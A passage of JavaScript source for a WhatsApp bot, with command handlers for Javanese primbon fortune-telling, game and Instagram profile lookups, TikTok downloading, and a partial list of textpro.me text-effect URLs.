                hisoka.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
            }
            break
            case prefix+'rejeki': case prefix+'rezeki': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Rezeki :* ${anu.message.rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case prefix+'pekerjaan': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Pekerjaan :* ${anu.message.pekerjaan}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case prefix+'ramalannasib': case prefix+'ramalnasib': case prefix+'nasib': {
                if (!text) throw `Example : 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.ramalan_nasib(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
            }
            break
            case prefix+'potensipenyakit': case prefix+'penyakit': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Sektor :* ${anu.message.sektor}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case prefix+'artitarot': case prefix+'tarot': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendImage(m.chat, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case prefix+'fengshui': {
                if (!text) throw `Example : ${prefix + command} Dika, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
                let [nama, gender, tahun] = text.split`,`
                let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tahun_lahir}\n⭔ *Gender :* ${anu.message.jenis_kelamin}\n⭔ *Angka Kua :* ${anu.message.angka_kua}\n⭔ *Kelompok :* ${anu.message.kelompok}\n⭔ *Karakter :* ${anu.message.karakter}\n⭔ *Sektor Baik :* ${anu.message.sektor_baik}\n⭔ *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
            }
            break
            case prefix+'haribaik': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.petung_hari_baik(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case prefix+'harisangar': case prefix+'taliwangke': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case prefix+'harinaas': case prefix+'harisial': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
            }
            break
            case prefix+'nagahari': case prefix+'harinaga': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case prefix+'arahrejeki': case prefix+'arahrezeki': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case prefix+'peruntungan': {
                if (!text) throw `Example : ${prefix + command} DIka, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
                let [nama, tgl, bln, thn, untuk] = text.split`,`
                let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case prefix+'weton': case prefix+'wetonjawa': {
                if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.weton_jawa(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
            }
            break
            case prefix+'sifat': case prefix+'karakter': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
            }
            break
            case prefix+'keberuntungan': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`, m)
            }
            break
            case prefix+'memancing': {
                if (!text) throw `Example : ${prefix + command} 12, 1, 2022`
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case prefix+'masasubur': {
                if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
                let [tgl, bln, thn, siklus] = text.split`,`
                let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case prefix+'zodiak': case prefix+'zodiac': {
                if (!text) throw `Example : ${prefix+ command} 7 7 2005`
                let zodiak = [
                    ["capricorn", new Date(1970, 0, 1)],
                    ["aquarius", new Date(1970, 0, 20)],
                    ["pisces", new Date(1970, 1, 19)],
                    ["aries", new Date(1970, 2, 21)],
                    ["taurus", new Date(1970, 3, 21)],
                    ["gemini", new Date(1970, 4, 21)],
                    ["cancer", new Date(1970, 5, 22)],
                    ["leo", new Date(1970, 6, 23)],
                    ["virgo", new Date(1970, 7, 23)],
                    ["libra", new Date(1970, 8, 23)],
                    ["scorpio", new Date(1970, 9, 23)],
                    ["sagittarius", new Date(1970, 10, 22)],
                    ["capricorn", new Date(1970, 11, 22)]
                ].reverse()

                function getZodiac(month, day) {
                    let d = new Date(1970, month - 1, day)
                    return zodiak.find(([_,_d]) => d >= _d)[0]
                }
                let date = new Date(text)
                if (date == 'Invalid Date') throw date
                let d = new Date()
                let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
                let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

                let zodiac = await getZodiac(birth[1], birth[2])
                
                let anu = await primbon.zodiak(zodiac)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case prefix+'shio': {
                if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
                let anu = await primbon.shio(text)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `⭔ *Hasil :* ${anu.message}`, m)
            }
            break
	    case prefix+'stalker': case prefix+'stalk': {
		if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply('Limit Harian Anda Telah Habis')
                if (!text) return m.reply(`Example : ${prefix +command} type id\n\nList Type :\n1. ff (Free Fire)\n2. ml (Mobile Legends)\n3. aov (Arena Of Valor)\n4. cod (Call Of Duty)\n5. pb (point Blank)\n6. ig (Instagram)\n7. npm (https://npmjs.com)`)
                let [type, id, zone] = args
                if (type.toLowerCase() == 'ff') {
                    if (!id) throw `No Query id, Example ${prefix + command} ff 552992060`
                    let anu = await fetchJson(api('zenz', '/api/nickff', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'ml') {
                    if (!id) throw `No Query id, Example : ${prefix + command} ml 214885010 2253`
                    if (!zone) throw `No Query id, Example : ${prefix + command} ml 214885010 2253`
                    let anu = await fetchJson(api('zenz', '/api/nickml', { apikey: global.APIKeys[global.APIs['zenz']], query: id, query2: zone }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nZone : ${anu.result.zoneId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'aov') {
                    if (!id) throw `No Query id, Example ${prefix + command} aov 293306941441181`
                    let anu = await fetchJson(api('zenz', '/api/nickaov', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'cod') {
                    if (!id) throw `No Query id, Example ${prefix + command} cod 6290150021186841472`
                    let anu = await fetchJson(api('zenz', '/api/nickcod', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'pb') {
                    if (!id) throw `No Query id, Example ${prefix + command} pb riio46`
                    let anu = await fetchJson(api('zenz', '/api/nickpb', { apikey: global.APIKeys[global.APIs['zenz']], query: id }))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`ID : ${anu.result.gameId}\nUsername : ${anu.result.userName}`)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'ig') {
                    if (!id) throw `No Query username, Example : ${prefix + command} ig cak_haho`
                    let { result: anu } = await fetchJson(api('zenz', '/api/stalker/ig', { username: id }, 'apikey'))
                    if (anu.status == false) return m.reply(anu.result.message)
                    hisoka.sendMedia(m.chat, anu.caption.profile_hd, '', `⭔ Full Name : ${anu.caption.full_name}\n⭔ User Name : ${anu.caption.user_name}\n⭔ ID ${anu.caption.user_id}\n⭔ Followers : ${anu.caption.followers}\n⭔ Following : ${anu.caption.following}\n⭔ Bussines : ${anu.caption.bussines}\n⭔ Profesional : ${anu.caption.profesional}\n⭔ Verified : ${anu.caption.verified}\n⭔ Private : ${anu.caption.private}\n⭔ Bio : ${anu.caption.biography}\n⭔ Bio Url : ${anu.caption.bio_url}`, m)
		    db.data.users[m.sender].limit -= 1
                } else if (type.toLowerCase() == 'npm') {
                    if (!id) throw `No Query username, Example : ${prefix + command} npm scrape-primbon`
                    let { result: anu } = await fetchJson(api('zenz', '/api/stalker/npm', { query: id }, 'apikey'))
                    if (anu.status == false) return m.reply(anu.result.message)
                    m.reply(`⭔ Name : ${anu.name}\n⭔ Version : ${Object.keys(anu.versions)}\n⭔ Created : ${tanggal(anu.time.created)}\n⭔ Modified : ${tanggal(anu.time.modified)}\n⭔ Maintainers :\n ${anu.maintainers.map(v => `- ${v.name} : ${v.email}`).join('\n')}\n\n⭔ Description : ${anu.description}\n⭔ Homepage : ${anu.homepage}\n⭔ Keywords : ${anu.keywords}\n⭔ Author : ${anu.author.name}\n⭔ License : ${anu.license}\n⭔ Readme : ${anu.readme}`)
		    db.data.users[m.sender].limit -= 1
                } else {
                    m.reply(`Example : ${prefix +command} type id\n\nList Type :\n1. ff (Free Fire)\n2. ml (Mobile Legends)\n3. aov (Arena Of Valor)\n4. cod (Call Of Duty)\n5. pb (point Blank)\n6. ig (Instagram)\n7. npm (https://npmjs.com)`)
                }
            }
            break

            case prefix+'tiktok': case prefix+'tiktoknowm': {
            if (!text) throw 'Masukkan Query Link!'
                            hisoka.sendMessage(m.chat, waitv2, { quoted: m })

            await expar.downloader.tiktok(text).then( data => {
            hisoka.sendMessage(m.chat, {
            video: { url: data.media[1].url },
            caption: `${data.title}`
            }, { quoted: m })
            })
            }
            break
            case prefix+'tiktokmp3': case prefix+'tiktokaudio': {
                if (!text) throw 'Masukkan Query Link!'
                                hisoka.sendMessage(m.chat, waitv2, { quoted: m })
      
              
              let bilek =  await expar.downloader.tiktok(text)
              hisoka.sendMessage(m.chat, { document: { url: bilek.media[2].url }, mimetype: 'audio/mpeg', fileName: `${bilek.title}.mp3` }, { quoted: m })
            }
            break
case prefix+'textpro': {
if (!text) throw `Masukan text nya!`
let cuks = []
let effects = [
    {
    "title": "1917Style",
    "url": "https://textpro.me/1917-style-text-effect-online-980.html"
  },
  {
    "title": "80RetroNeon",
    "url": "https://textpro.me/80-s-retro-neon-text-effect-online-979.html"
  },
  {
    "title": "3Ddeepseametal",
    "url": "https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html"
  },
  {
    "title": "3Dscifi",
    "url": "https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html"
  },
  {
    "title": "3Drainbow",
    "url": "https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html"
  },
  {
    "title": "3Dwaterpipe",
    "url": "https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html"
  },
  {
    "title": "3Dstonecrackedcool",
    "url": "https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html"
  },
  {
    "title": "3Dneonlight",
    "url": "https://textpro.me/create-3d-neon-light-text-effect-online-1028.html"
  },
  {
    "title": "3Dgradient2",
    "url": "https://textpro.me/online-3d-gradient-text-effect-generator-1020.html"
  },
  {
    "title": "3Dglossymetal",
    "url": "https://textpro.me/create-a-3d-glossy-metal-text-effect-1019.html"
  },
  {
    "title": "3Donthebeach",
    "url": "https://textpro.me/create-3d-realistic-text-effect-on-the-beach-online-1018.html"
  },
  {
    "title": "3Dpapercut",
    "url": "https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html"
  },
  {
    "title": "3Dunderwatergenerator",
    "url": "https://textpro.me/3d-underwater-text-effect-generator-online-1013.html"
  },
  {
    "title": "3Dluxurygold",
    "url": "https://textpro.me/3d-luxury-gold-text-effect-online-1003.html"
  },
  {
    "title": "3Dgradient1",
    "url": "https://textpro.me/3d-gradient-text-effect-online-free-1002.html"
  },
  {
    "title": "3Dsandengraved",
    "url": "https://textpro.me/sand-engraved-3d-text-effect-989.html"
  },
  {
    "title": "3Dgluerealistic",
    "url": "https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html"
  },
  {
    "title": "3DAvengerslogo",
    "url": "https://textpro.me/create-3d-avengers-logo-online-974.html"
  },
  {
    "title": "3DMetalSilver",
    "url": "https://textpro.me/text-logo-3d-metal-silver-946.html"
  },
  {
    "title": "3DMetalRoseGold",
    "url": "https://textpro.me/text-logo-3d-metal-rose-gold-945.html"
  },
  {
    "title": "3DMetalGold",
    "url": "https://textpro.me/text-logo-3d-metal-gold-944.html"
  },
  {
    "title": "3DMetalGalaxy",
    "url": "https://textpro.me/text-logo-3d-metal-galaxy-943.html"
  },
  {
    "title": "3DXmasCards",
    "url": "https://textpro.me/xmas-cards-3d-online-942.html"
  },
  {
    "title": "3DBox",
    "url": "https://textpro.me/3d-box-text-effect-online-880.html"
  },
  {
    "title": "3DSteel",
    "url": "https://textpro.me/3d-steel-text-effect-877.html"
  },
  {
    "title": "3DGlowingMetal",
    "url": "https://textpro.me/3d-glowing-metal-text-effect-828.html"
  },
  {
    "title": "3DChrome",
    "url": "https://textpro.me/3d-chrome-text-effect-827.html"
  },
    {
    "title": "AbstraGold",
    "url": "https://textpro.me/abstra-gold-text-effect-859.html"
  },
    {
    "title": "Americanflag3D",
    "url": "https://textpro.me/create-american-flag-3d-text-effect-online-1051.html"
  },
    {
    "title": "Artisticbw",
    "url": "https://textpro.me/create-artistic-black-and-white-status-and-quote-with-your-photos-1021.html"
  },
    {
    "title": "AspookyHalloween",
    "url": "https://textpro.me/create-a-spooky-halloween-text-effect-online-1046.html"
  },
    {
    "title": "Avatargold",
    "url": "https://textpro.me/create-avatar-gold-online-956.html"
  },
   {
    "title": "Bagel",
    "url": "https://textpro.me/bagel-text-effect-857.html"
  },
  {
    "title": "Berry",
    "url": "https://textpro.me/create-berry-text-effect-online-free-1033.html"
  },
  {
    "title": "Biscuit",
    "url": "https://textpro.me/biscuit-text-effect-858.html"
  },
  {
    "title": "BlackMetal",
    "url": "https://textpro.me/black-metal-text-effect-829.html"
  },
  {
    "title": "Blackpink",
    "url": "https://textpro.me/create-blackpink-logo-style-online-1001.html"
  },
  {
    "title": "Blackwhitebear",
    "url": "https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html"
  },
  {
    "title": "BloodText",
    "url": "https://textpro.me/blood-text-on-the-frosted-glass-941.html"
  },
  {
    "title": "BlueBalloon",
    "url": "https://textpro.me/blue-foil-balloon-text-effect-923.html"
  },
  {
    "title": "Bluecircuit",
    "url": "https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html"
  },
  {
    "title": "BlueGem",
    "url": "https://textpro.me/blue-gem-text-effect-830.html"
  },
  {
    "title": "BlueGlass",
    "url": "https://textpro.me/blue-glass-text-effect-908.html"
  },
  {
    "title": "BlueGlitter",
    "url": "https://textpro.me/blue-glitter-text-effect-841.html"
  },
  {
    "title": "BlueJewelry1",
    "url": "https://textpro.me/blue-sparkling-jewelry-text-effect-898.html"
  },
 {
    "title": "BlueJewelry2",
    "url": "https://textpro.me/blue-jewelry-text-effect-844.html"
  },
  {
    "title": "BlueMetalic",
    "url": "https://textpro.me/blue-metal-text-effect-831.html"
  },
  {
    "title": "Bokeh",
    "url": "https://textpro.me/bokeh-text-effect-876.html"
  },
  {
    "title": "Bread",
    "url": "https://textpro.me/bread-text-effect-online-887.html"
  },
  {
    "title": "BreakWall",
    "url": "https://textpro.me/break-wall-text-effect-871.html"
  },
  {
    "title": "Brokenglass",
    "url": "https://textpro.me/broken-glass-text-effect-free-online-1023.html"
  },
  {
    "title": "BronzeGlitter",
    "url": "https://textpro.me/bronze-glitter-text-effect-835.html"
  },
  {
    "title": "CaptainAmerica1",
    "url": "https://textpro.me/create-a-captain-america-text-effect-free-online-1039.html"
  },
  {
    "title": "CaptainAmerica2",
    "url": "https://textpro.me/captain-america-text-effect-905.html"
  },
  {
    "title": "Carbon",
    "url": "https://textpro.me/carbon-text-effect-833.html"
  },
  {
    "title": "Cinematichorror",
    "url": "https://textpro.me/create-a-cinematic-horror-text-effect-1045.html"
  },
  {
    "title": "Cloudinthesky",
    "url": "https://textpro.me/create-a-cloud-text-effect-in-the-sky-online-997.html"
  },
  {
    "title": "Cloudonthesky",
    "url": "https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html"
  },
  {
    "title": "ChrismastGift",
    "url": "https://textpro.me/chrismast-gift-text-effect-869.html"
  },
  {
    "title": "Christmasholiday",
    "url": "https://textpro.me/create-a-christmas-holiday-snow-text-effect-1007.html"
  },
  {
    "title": "ChocolateCake",
    "url": "https://textpro.me/chocolate-cake-text-effect-890.html"
  },
  {
    "title": "coolgraffiti",
    "url": "https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html"
  },
  {
    "title": "coolwallgraffiti",
    "url": "https://textpro.me/create-cool-wall-graffiti-text-effect-online-1009.html"
  },
{
    "title": "CyanJewelry2",
    "url": "https://textpro.me/cyan-jewelry-text-effect-845.html"
  },
{
    "title": "CyanJewelry1",
    "url": "https://textpro.me/cyan-sparkling-jewelry-text-effect-893.html"
},
{
    "title": "CyanGlass",
    "url": "https://textpro.me/cyan-glass-text-effect-909.html"
  },
{
    "title": "CyanBalloon",
    "url": "https://textpro.me/cyan-foil-balloon-text-effect-924.html"
  },
{
    "title": "DoubleExposure",
    "url": "https://textpro.me/double-exposure-text-effect-black-white-976.html"
  },
{
    "title": "DeluxeSilver",
    "url": "https://textpro.me/deluxe-silver-text-effect-970.html"
  },
{
    "title": "DeluxeGold",
    "url": "https://textpro.me/deluxe-gold-text-effect-966.html"
  },
{
    "title": "Denim",
    "url": "https://textpro.me/denim-text-effect-online-919.html"
  },
{
    "title": "DecorateGreen",
    "url": "https://textpro.me/decorate-green-text-effect-918.html"
  },
  {
    "title": "DecoratePurple",
    "url": "https://textpro.me/decorate-purple-text-effect-917.html"
  },
{
    "title": "Dropwater",
    "url": "https://textpro.me/dropwater-text-effect-872.html"
  },
{
    "title": "DecorativeGlass",
    "url": "https://textpro.me/decorative-glass-text-effect-891.html"
  },
  {
    "title": "ErodedMetal",
    "url": "https://textpro.me/eroded-metal-text-effect-834.html"
  },
  {
    "title": "Emboscracked",
    "url": "https://textpro.me/create-embossed-text-effect-on-cracked-surface-1024.html"
  },
  {
    "title": "Fabric",
    "url": "https://textpro.me/fabric-text-effect-online-964.html"
  },
  {
    "title": "FreeAdvancedGlow",
    "url": "https://textpro.me/free-advanced-glow-text-effect-873.html"
  },
  {
    "title": "FruitJuice",
    "url": "https://textpro.me/fruit-juice-text-effect-861.html"
  },
  {
    "title": "FireworkSparkle",
    "url": "https://textpro.me/firework-sparkle-text-effect-930.html"
  },
  {
    "title": "FoilBalloonBirthday",
    "url": "https://textpro.me/foil-balloon-text-effect-for-birthday-987.html"
  },
  {
    "title": "Futuristictechnology",
    "url": "https://textpro.me/create-a-futuristic-technology-neon-light-text-effect-1006.html"
  },
  {
    "title": "Gameclassic",
    "url": "https://textpro.me/video-game-classic-8-bit-text-effect-1037.html"
  },
  {
    "title": "Glitch1",
    "url": "https://textpro.me/create-a-glitch-text-effect-online-free-1026.html"
  },
  {
    "title": "GlitchTikTok",
    "url": "https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html"
  },
  {
    "title": "Glossymetalic",
    "url": "https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html"
  },
  {
    "title": "GlossyBlueMetal",
    "url": "https://textpro.me/glossy-blue-metal-text-effect-967.html"
  },
  {
    "title": "GlossyCarbon",
    "url": "https://textpro.me/glossy-carbon-text-effect-965.html"
  },
  {
    "title": "GoldBalloon",
    "url": "https://textpro.me/gold-foil-balloon-text-effect-922.html"
  },
  {
    "title": "GoldJewelry",
    "url": "https://textpro.me/gold-sparkling-jewelry-text-effect-895.html"
  },
  {
    "title": "GoldGlitter",
    "url": "https://textpro.me/gold-glitter-text-effect-836.html"
  },
  {
    "title": "GreenBalloon",
    "url": "https://textpro.me/green-foil-balloon-text-effect-925.html"
  },
  {
    "title": "Greenhorror",
    "url": "https://textpro.me/create-green-horror-style-text-effect-online-1036.html"
  },
  {
    "title": "GreenGlass",
    "url": "https://textpro.me/green-glass-text-effect-910.html"
  },
  {
    "title": "GreenGlitter",
    "url": "https://textpro.me/green-glitter-text-effect-838.html"
  },
  {
    "title": "GreenJewelry1",
    "url": "https://textpro.me/green-jewelry-text-effect-846.html"
  },
  {
    "title": "GreenJewelry2",
    "url": "https://textpro.me/green-sparkling-jewelry-text-effect-897.html"
  },
  {
    "title": "GreenNeon",
    "url": "https://textpro.me/green-neon-text-effect-874.html"
  },
  {
    "title": "Halloweenskeleton",
    "url": "https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html"
  },
  {
    "title": "HalloweenFire",
    "url": "https://textpro.me/halloween-fire-text-effect-940.html"
  },
  {
    "title": "HarryPotter",
    "url": "https://textpro.me/create-harry-potter-text-effect-online-1025.html"
  },
  {
    "title": "HexaGolden",
    "url": "https://textpro.me/hexa-golden-text-effect-842.html"
  },
  {
    "title": "Holographic3D",
    "url": "https://textpro.me/holographic-3d-text-effect-975.html"
  },
  {
    "title": "Honey",
    "url": "https://textpro.me/honey-text-effect-868.html"
  },
  {
    "title": "HotMetal",
    "url": "https://textpro.me/hot-metal-text-effect-843.html"
  },
  {
    "title": "HorrorBlood",
    "url": "https://textpro.me/horror-blood-text-effect-online-883.html"
  },
  {
    "title": "HorrorGift",
    "url": "https://textpro.me/horror-gift-text-effect-866.html"
  },
  {
    "title": "IceCold",
    "url": "https://textpro.me/ice-cold-text-effect-862.html"
  },
  {
    "title": "Impressiveglitch",
    "url": "https://textpro.me/create-impressive-glitch-text-effects-online-1027.html"
  },
  {
    "title": "KoiFish",
    "url": "https://textpro.me/koi-fish-text-effect-online-888.html"
  },
  {
    "title": "Lava",
    "url": "https://textpro.me/lava-text-effect-online-914.html"
  },
  {
    "title": "Layered",
    "url": "https://textpro.me/create-layered-text-effects-online-free-1032.html"
  },
  {
    "title": "LionLogo",
    "url": "https://textpro.me/create-lion-logo-mascot-online-938.html"
  },
  {
    "title": "LogoJoker",
    "url": "https://textpro.me/create-logo-joker-online-934.html"
  },
  {
    "title": "LuxuryMetal",
    "url": "https://textpro.me/color-full-luxury-metal-text-effect-969.html"
  },
  {
    "title": "Magma",
    "url": "https://textpro.me/create-a-magma-hot-text-effect-online-1030.html"
  },
  {
    "title": "MarbleSlabs",
    "url": "https://textpro.me/marble-slabs-text-effect-864.html"
  },
  {
    "title": "Marble1",
    "url": "https://textpro.me/marble-text-effect-863.html"
  },
  {
    "title": "Marvelmetal",
    "url": "https://textpro.me/create-logo-style-marvel-studios-ver-metal-972.html"
  },
  {
    "title": "Marvelstudios",
    "url": "https://textpro.me/create-logo-style-marvel-studios-online-971.html"
  },
  {
    "title": "MatrixStyle",
    "url": "https://textpro.me/matrix-style-text-effect-online-884.html"
  },
  {
    "title": "MetalDarkGold1",
    "url": "https://textpro.me/metal-dark-gold-text-effect-984.html"
  },
  {
    "title": "MetalDarkGold2",
